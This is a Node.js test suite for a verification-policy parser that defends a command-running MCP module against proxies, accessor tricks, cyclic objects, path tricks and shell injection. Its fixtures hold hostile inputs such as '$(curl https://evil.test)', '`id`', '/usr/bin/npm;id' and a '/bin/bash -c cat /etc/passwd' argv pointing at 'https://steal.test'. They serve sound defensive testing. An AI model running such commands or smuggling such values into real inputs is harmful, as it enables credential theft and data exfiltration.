import assert from 'node:assert/strict';
import { types as utilTypes } from 'node:util';
import test from 'node:test';

import { RunContractV1Error } from '../mcp/v3/run-manifest.mjs';
import {
  MAX_COMMANDS,
  MAX_POLICY_DEPTH,
  parseUntrustedCommandReferenceV1,
  parseVerificationCommandDescriptorV1,
  parseVerificationPolicyV1,
  rejectUntrustedExecutableContentV1,
  verificationPolicyDigestV1,
} from '../mcp/v3/trusted-verification-policy.mjs';
import {
  countingProxy,
  trapTotal,
  validCommand,
  validPolicy,
} from './fixtures/r1-verification-policy-fixtures.mjs';

function errorOf(action, expectedPath) {
  try {
    action();
  } catch (error) {
    assert.ok(error instanceof RunContractV1Error, `expected RunContractV1Error, got ${error}`);
    if (expectedPath !== undefined) assert.equal(error.path, expectedPath);
    return error;
  }
  assert.fail('expected a typed RunContractV1Error');
}

test('live proxies are denied with zero traps on every policy surface', () => {
  const { proxy, counts } = countingProxy(validPolicy());
  assert.equal(errorOf(() => parseVerificationPolicyV1(proxy)).code, 'proxy_denied');
  assert.equal(trapTotal(counts), 0);

  const digestCounts = countingProxy(validPolicy());
  assert.equal(errorOf(() => verificationPolicyDigestV1(digestCounts.proxy)).code, 'proxy_denied');
  assert.equal(trapTotal(digestCounts.counts), 0);

  const commandCounts = countingProxy(validCommand());
  assert.equal(errorOf(() => parseVerificationCommandDescriptorV1(commandCounts.proxy)).code, 'proxy_denied');
  assert.equal(trapTotal(commandCounts.counts), 0);

  const untrustedCounts = countingProxy({ command_id: 'unit-tests' });
  assert.equal(errorOf(() => parseUntrustedCommandReferenceV1(untrustedCounts.proxy)).code, 'proxy_denied');
  assert.equal(trapTotal(untrustedCounts.counts), 0);
});

test('revoked proxies fail closed before Array.isArray or Reflect can throw', () => {
  const { proxy, revoke } = Proxy.revocable(validPolicy(), {
    get() { throw new Error('revoked get'); },
    ownKeys() { throw new Error('revoked ownKeys'); },
    getOwnPropertyDescriptor() { throw new Error('revoked descriptor'); },
  });
  revoke();
  assert.equal(utilTypes.isProxy(proxy), true);
  const error = errorOf(() => parseVerificationPolicyV1(proxy));
  assert.equal(error.code, 'proxy_denied');
  assert.throws(() => Array.isArray(proxy), TypeError);
  assert.equal(error.message.includes('revoked get'), false);
  assert.equal(error.message.includes('TypeError'), false);
});

test('accessor properties are rejected and their getters never run', () => {
  let reads = 0;
  const getterPolicy = validPolicy();
  Object.defineProperty(getterPolicy, 'schema', {
    enumerable: true,
    get() {
      reads += 1;
      return 'codex-co-engineer.verification-policy.v1';
    },
  });
  assert.equal(errorOf(() => parseVerificationPolicyV1(getterPolicy)).code, 'accessor_property_denied');
  assert.equal(reads, 0);

  let throwingReads = 0;
  const throwingCommand = validCommand();
  Object.defineProperty(throwingCommand, 'executable', {
    enumerable: true,
    get() {
      throwingReads += 1;
      throw new Error('getter bomb /etc/shadow');
    },
  });
  const error = errorOf(() => parseVerificationCommandDescriptorV1(throwingCommand));
  assert.equal(error.code, 'accessor_property_denied');
  assert.equal(throwingReads, 0);
  assert.equal(error.message.includes('/etc/shadow'), false);
  assert.equal(error.message.includes('getter bomb'), false);
});

test('non-enumerable fields, symbol keys, and exotic prototypes are denied', () => {
  const hidden = validPolicy();
  Object.defineProperty(hidden, 'version', { enumerable: false, value: 1 });
  assert.equal(errorOf(() => parseVerificationPolicyV1(hidden)).code, 'non_enumerable_property_denied');

  const symbolled = validPolicy();
  symbolled[Symbol('injected')] = '/bin/sh';
  const symbolError = errorOf(() => parseVerificationPolicyV1(symbolled));
  assert.equal(symbolError.code, 'symbol_key_denied');
  assert.equal(symbolError.message.includes('/bin/sh'), false);

  class SpoofedPolicy {}
  const instance = new SpoofedPolicy();
  Object.assign(instance, validPolicy());
  assert.equal(errorOf(() => parseVerificationPolicyV1(instance)).code, 'invalid_type');
  assert.equal(errorOf(() => parseVerificationPolicyV1(new Map())).code, 'invalid_type');
  assert.equal(errorOf(() => parseVerificationPolicyV1(new Date())).code, 'invalid_type');

  const nullProto = Object.create(null);
  Object.assign(nullProto, validPolicy());
  assert.doesNotThrow(() => parseVerificationPolicyV1(nullProto));
});

test('own undefined values, boxed values, and coercion hooks never contribute', () => {
  assert.equal(
    errorOf(() => parseVerificationPolicyV1(validPolicy({ version: undefined }))).code,
    'own_undefined_denied',
  );
  let coerced = 0;
  const sneaky = { valueOf() { coerced += 1; return 1; } };
  assert.equal(
    errorOf(() => parseVerificationPolicyV1(validPolicy({ version: sneaky }))).code,
    'invalid_json_type',
  );
  assert.equal(coerced, 0);
  const boxed = validCommand({ command_id: new String('unit-tests') });
  assert.equal(errorOf(() => parseVerificationCommandDescriptorV1(boxed)).code, 'exotic_prototype_denied');
});

test('cyclic, aliased, deep, and oversized payloads are rejected before effects', () => {
  const cyclic = validPolicy();
  cyclic.self = cyclic;
  assert.equal(errorOf(() => parseVerificationPolicyV1(cyclic)).code, 'aliased_reference_denied');

  const shared = { marker: true };
  const aliased = validPolicy();
  aliased.first = shared;
  aliased.second = shared;
  assert.equal(errorOf(() => parseVerificationPolicyV1(aliased)).code, 'aliased_reference_denied');

  let deep = { leaf: 1 };
  for (let index = 0; index < MAX_POLICY_DEPTH + 4; index += 1) deep = { wrapped: deep };
  const deepPolicy = validPolicy();
  deepPolicy.deep = deep;
  assert.equal(errorOf(() => parseVerificationPolicyV1(deepPolicy)).code, 'value_depth_exceeded');

  const wide = validPolicy({
    commands: Array.from({ length: MAX_COMMANDS + 1 }, (unused, index) => validCommand({
      command_id: `cmd-${index}`,
    })),
  });
  assert.equal(errorOf(() => parseVerificationPolicyV1(wide)).code, 'out_of_range');
});

test('the closure gate precedes the closed vocabulary check', () => {
  const unknownButHostile = validPolicy();
  unknownButHostile.unknown_key = { nested: unknownButHostile };
  assert.equal(errorOf(() => parseVerificationPolicyV1(unknownButHostile)).code, 'aliased_reference_denied');
});

test('sparse and extended arrays are denied', () => {
  const sparse = validPolicy();
  const commands = new Array(2);
  commands[0] = validCommand();
  sparse.commands = commands;
  assert.equal(errorOf(() => parseVerificationPolicyV1(sparse)).code, 'invalid_array');

  const extended = [validCommand()];
  extended.extraProperty = true;
  assert.equal(
    errorOf(() => parseVerificationPolicyV1(validPolicy({ commands: extended }))).code,
    'invalid_array',
  );
});

test('non-finite and unsafe integers are denied', () => {
  for (const value of [Number.NaN, Infinity, -Infinity]) {
    assert.equal(
      errorOf(() => parseVerificationCommandDescriptorV1(validCommand({ timeout_ms: value }))).code,
      'invalid_json_value',
      String(value),
    );
  }
  for (const value of [1.5, -0]) {
    assert.equal(
      errorOf(() => parseVerificationCommandDescriptorV1(validCommand({ timeout_ms: value }))).code,
      'invalid_type',
      String(value),
    );
  }
});

test('executable path and argv hostiles stay closed', () => {
  const paths = [
    'npm',
    './npm',
    '../usr/bin/npm',
    '/usr/bin/../bin/npm',
    '/usr/bin/npm/',
    '/usr/bin//npm',
    '~/bin/npm',
    '/usr/bin/npm.exe:ads',
    '/usr/bin/n pm',
    '/usr/bin/npm;id',
    '/usr/bin/${SHELL}',
    '/usr/bin/npm\u2044hack',
    '/usr/bin/npm\u0000x',
  ];
  for (const executable of paths) {
    assert.equal(
      errorOf(() => parseVerificationCommandDescriptorV1(validCommand({ executable }))).code !== undefined,
      true,
      executable,
    );
  }
  assert.equal(
    errorOf(() => parseVerificationCommandDescriptorV1(validCommand({
      argv_template: ['test', '$(whoami)'],
    }))).code,
    'shell_content_denied',
  );
  assert.equal(
    errorOf(() => parseVerificationCommandDescriptorV1(validCommand({
      argv_template: ['test', '`id`'],
    }))).code,
    'shell_content_denied',
  );
});

test('untrusted shell text in parameters is denied without echoing it', () => {
  const payload = { command_id: 'unit-tests', parameters: { file: '$(curl https://evil.test)' } };
  const error = errorOf(() => parseUntrustedCommandReferenceV1(payload));
  assert.equal(error.code, 'shell_content_denied');
  assert.equal(error.message.includes('curl'), false);
  assert.equal(error.message.includes('evil.test'), false);
  assert.equal(error.message.includes('$('), false);
});

test('content-free errors never echo attacker keys, paths, URLs, or native stacks', () => {
  const error = errorOf(() => parseVerificationPolicyV1(validPolicy({
    extra: { argv: ['/bin/bash', '-c', 'cat /etc/passwd'], url: 'https://steal.test' },
  })));
  assert.equal(error.code, 'unknown_key');
  assert.equal(error.message.includes('extra'), false);
  assert.equal(error.message.includes('/bin/bash'), false);
  assert.equal(error.message.includes('/etc/passwd'), false);
  assert.equal(error.message.includes('https://steal.test'), false);
  assert.equal(error.message.includes('at parse'), false);
});

test('rejectUntrustedExecutableContentV1 walks nested profile and provider shapes', () => {
  const nestedProfile = {
    name: 'review',
    policy: { commands: [{ command_id: 'x', executable: '/bin/sh' }] },
  };
  assert.equal(
    errorOf(() => rejectUntrustedExecutableContentV1(nestedProfile)).code,
    'executable_content_denied',
  );
  const provider = {
    claims: [{ command_id: 'unit-tests', network: 'allow' }],
  };
  assert.equal(
    errorOf(() => rejectUntrustedExecutableContentV1(provider)).code,
    'network_content_denied',
  );
});
